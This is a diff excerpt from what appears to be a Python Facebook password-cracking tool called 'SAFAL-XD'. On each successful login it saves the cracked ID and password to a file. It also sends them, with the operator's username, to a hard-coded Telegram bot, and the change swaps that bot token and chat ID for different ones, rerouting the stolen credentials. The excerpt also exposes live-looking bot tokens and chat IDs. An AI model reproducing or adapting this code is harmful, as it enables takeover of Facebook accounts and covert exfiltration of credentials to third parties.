@@ -862,8 +862,8 @@ def api1(ids,names,passlist):
                                         print('\r\r\033[1;32m [SAFAL-XD] '+ids+' | '+pas+'\033[1;97m')
                                         print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                         open('/sdcard/SAFAL-XD.txt','a').write(ids+'|'+pas+'\n')
-                                        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=2145350993&text="+username+"\n[ "+ids+' | '+pas+ " ]")
-                                      #  requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6221197589&text="+username+"\n[ "+ids+' | '+pas+ " ]")
+                                        requests.get("https://api.telegram.org/6151004714:AAHx2LXKAQ5YY-GCfu-Sqvd3LQ3EmVuR-BU/sendMessage?chat_id=6118288082&text="+username+"\n[ "+ids+' | '+pas+ " ]")
+                                      #  requests.get("https://api.telegram.org/6151004714:AAHx2LXKAQ5YY-GCfu-Sqvd3LQ3EmVuR-BU/sendMessage?chat_id=6118288082&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
